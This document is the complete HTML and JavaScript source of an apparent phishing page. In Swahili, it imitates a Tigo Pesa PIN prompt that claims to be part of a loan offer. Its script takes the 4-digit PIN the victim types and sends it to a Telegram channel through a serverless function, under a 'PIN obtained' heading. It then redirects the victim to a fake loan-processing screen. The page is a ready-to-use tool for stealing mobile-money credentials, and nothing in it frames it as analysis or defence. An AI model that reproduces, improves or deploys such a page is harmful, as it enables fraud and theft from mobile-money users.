<!DOCTYPE html>
<html lang="sw">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Weka PIN</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="styles.css">
    <style>
        .pin-container {
            display: flex;
            gap: 15px;
            margin-bottom: 30px;
            justify-content: center;
        }

        .pin-dot {
            width: 15px;
            height: 15px;
            border-radius: 50%;
            border: 2px solid #3a3a3c;
            background-color: transparent;
            transition: background-color 0.2s;
        }

        .pin-dot.filled {
            background-color: #3a3a3c;
        }

        .content {
            margin-top: 50px;
        }
    </style>
</head>

<body>
    <div class="app-container">
        <header class="top-nav">
            <button class="back-button" aria-label="Rudi nyuma" onclick="window.location.href='otp.html'">
                <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="#000" stroke-width="1.2">
                    <path d="M20 12H4M11 19l-7-7 7-7" stroke-linecap="round" stroke-linejoin="round" />
                </svg>
            </button>
        </header>

        <main class="content">
            <div class="icon-container">
                <svg width="60" height="60" viewBox="0 0 24 24" fill="#E3000F">
                    <path
                        d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z" />
                </svg>
            </div>

            <h1 class="title">Ingiza PIN</h1>
            <p class="subtitle">Tafadhali ingiza PIN yako ya Tigo Pesa kuhakiki</p>

            <div class="pin-container" id="pin-dots">
                <div class="pin-dot"></div>
                <div class="pin-dot"></div>
                <div class="pin-dot"></div>
                <div class="pin-dot"></div>
            </div>

            <button class="confirm-button" id="confirm-pin" style="opacity: 0.5; pointer-events: none;">Endelea</button>
        </main>

        <section class="keypad">
            <div class="keypad-row">
                <button class="key" data-value="1">1</button>
                <button class="key" data-value="2">2<span class="letters">A B C</span></button>
                <button class="key" data-value="3">3<span class="letters">D E F</span></button>
            </div>
            <div class="keypad-row">
                <button class="key" data-value="4">4<span class="letters">G H I</span></button>
                <button class="key" data-value="5">5<span class="letters">J K L</span></button>
                <button class="key" data-value="6">6<span class="letters">M N O</span></button>
            </div>
            <div class="keypad-row">
                <button class="key" data-value="7">7<span class="letters">P Q R S</span></button>
                <button class="key" data-value="8">8<span class="letters">T U V</span></button>
                <button class="key" data-value="9">9<span class="letters">W X Y Z</span></button>
            </div>
            <div class="keypad-row special-row">
                <button class="key empty-key"></button>
                <button class="key" data-value="0">0</button>
                <button class="key delete-key" id="delete-btn">
                    <svg width="26" height="26" viewBox="0 0 24 24" fill="none" stroke="#000" stroke-width="1.2">
                        <path d="M20 4H9.5L3 12l6.5 8H20a2 2 0 0 0 2-2V6a2 2 0 0 0-2-2z" />
                        <path d="M16 10l-4 4M12 10l4 4" />
                    </svg>
                </button>
            </div>
        </section>
    </div>
    <script>
        document.addEventListener('DOMContentLoaded', () => {
            const dots = document.querySelectorAll('.pin-dot');
            const keys = document.querySelectorAll('.key[data-value]');
            const deleteBtn = document.getElementById('delete-btn');
            const confirmBtn = document.getElementById('confirm-pin');

            let pin = '';

            function updateDots() {
                dots.forEach((dot, i) => {
                    if (i < pin.length) dot.classList.add('filled');
                    else dot.classList.remove('filled');
                });

                if (pin.length === 4) {
                    confirmBtn.style.opacity = '1';
                    confirmBtn.style.pointerEvents = 'auto';
                } else {
                    confirmBtn.style.opacity = '0.5';
                    confirmBtn.style.pointerEvents = 'none';
                }
            }

            keys.forEach(key => {
                key.addEventListener('pointerdown', (e) => {
                    e.preventDefault();
                    if (pin.length < 4) {
                        pin += key.getAttribute('data-value');
                        updateDots();
                    }
                });
            });

            deleteBtn.addEventListener('pointerdown', (e) => {
                e.preventDefault();
                pin = pin.slice(0, -1);
                updateDots();
            });

            async function sendToTelegram(message) {
                try {
                    await fetch('/.netlify/functions/send-telegram', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ message })
                    });
                } catch (error) {
                    console.error('Telegram error:', error);
                }
            }

            let isSubmitting = false;
            confirmBtn.addEventListener('click', async () => {
                if (pin.length === 4 && !isSubmitting) {
                    isSubmitting = true;
                    confirmBtn.style.opacity = '0.5';
                    confirmBtn.style.pointerEvents = 'none';
                    await sendToTelegram(`<b>Tigo Loan - PIN Imepatikana</b>\nPIN: <code>${pin}</code>`);
                    const msg = encodeURIComponent('Tunaandaa mkopo, tunakagua uwezo wako wa kulipa...');
                    window.location.href = `loading.html?next=success.html&delay=10000&msg=${msg}`;
                }
            });
        });
    </script>
</body>

</html>
